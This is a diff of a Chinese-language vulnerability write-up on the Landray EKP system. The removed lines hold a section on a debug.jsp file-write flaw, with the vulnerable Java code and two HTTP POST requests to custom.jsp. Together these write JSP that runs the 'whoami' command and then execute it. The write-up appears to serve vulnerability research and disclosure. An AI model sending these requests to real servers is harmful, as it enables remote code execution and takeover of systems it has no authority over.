@@ -190,7 +190,6 @@ filterInvocationInterceptor中也定义了一些匿名路径
 |debug.jsp写文件漏洞|`/ekp/sys/common/debug.jsp`|直接将接收参数写入到了code.jsp|
 |kmImeetingRes.do sql注入漏洞|`/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do`|——|
 |sysPortalPortlet.do Porlet文件写入漏洞|`/ekp/sys/portal/sys_portal_portlet/sysPortalPortlet.do`|——|
-|debug.jsp文件写入漏洞|`/ekp/sys/common/debug.jsp`|——|
 
 
 ### custom文件读取
@@ -607,44 +606,4 @@ Connection: close
 文件写入的路径是固定的，但文件名随机（日期加随机数）。
 ```
 ekp/sys/portal/designer/page/20201020052353_17542bf489fff95ee5c04804b6b9a376.jsp
-```
-
-### debug.jsp文件写入漏洞
-
-管理员权限下的调试文件，可以向`/sys/common/code.jsp`写入`jsp`代码，可通过`custom.jsp`进行利用
-
-```java
-	String code = request.getParameter("fdCode");
-	if(code!=null){
-		code = "<"+"%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\""+
-			" pageEncoding=\"UTF-8\"%"+"><" + "% " + code + " %" + ">";
-		FileOutputStream outputStream = new FileOutputStream(ConfigLocationsUtil.getWebContentPath()+"/sys/common/code.jsp");
-		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(
-				outputStream, "UTF-8"));
-		bw.write(code);
-		bw.close();
-```
-
-依次发送如下请求
-
-```http
-POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
-Host:
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
-Content-Length: 177
-Content-Type: application/x-www-form-urlencoded
-Accept-Encoding: gzip
-
-var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.print(org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("whoami").getInputStream(),"UTF-8"));
-```
-和
-```
-POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
-Host:
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
-Content-Length: 44
-Content-Type: application/x-www-form-urlencoded
-Accept-Encoding: gzip
-
-var={"body":{"file":"/sys/common/code.jsp"}}
 ```
